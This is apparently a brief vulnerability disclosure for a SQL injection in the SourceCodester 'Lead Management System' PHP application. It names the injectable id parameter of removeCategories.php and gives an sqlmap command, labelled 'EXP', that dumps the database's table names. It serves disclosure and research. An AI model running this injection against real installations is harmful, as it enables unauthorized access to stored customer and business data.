vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/15933/lead-management-system-php-open-source-free-download.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：

![image](https://user-images.githubusercontent.com/30823782/208410760-0cdbb490-86fe-43e2-bdfb-0481c95215a0.png)


EXP:

```
sqlmap.py -u "http://192.168.31.50/penglead/php_action/removeCategories.php?id=1" --dbms=mysql -D penglead --tables
```
![image](https://user-images.githubusercontent.com/30823782/208410813-392226e3-17b1-422b-832d-c266e88e55f1.png)
